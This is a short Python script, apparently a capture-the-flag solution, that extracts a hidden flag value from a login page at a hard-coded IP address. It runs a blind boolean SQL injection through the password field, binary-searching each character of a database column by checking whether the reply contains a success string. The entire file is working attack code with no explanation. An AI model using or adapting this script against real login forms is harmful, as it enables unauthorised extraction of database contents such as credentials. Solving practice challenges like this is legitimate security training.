import requests
r = requests.session()
charset = ''.join(chr(x) for x in range(32,128))
baseURL = "http://18.194.166.81:3334/old-login"
length = 28
flag = ""
for idx in range(0, length):
    left = 0
    right = len(charset) - 1
    while left < right:
        middle = int((left + right)/2)
        data = {"uname": "Admin", "psw": f"' or (select hex(substr(FlaggedFlag,{idx+1},1)) from flag) <= hex('{charset[middle]}')--"}
        res = r.post(baseURL, data=data)
        if "You" in res.text:
            right = middle
        else:
            left = middle + 1
    flag = flag + charset[right]
    print(flag)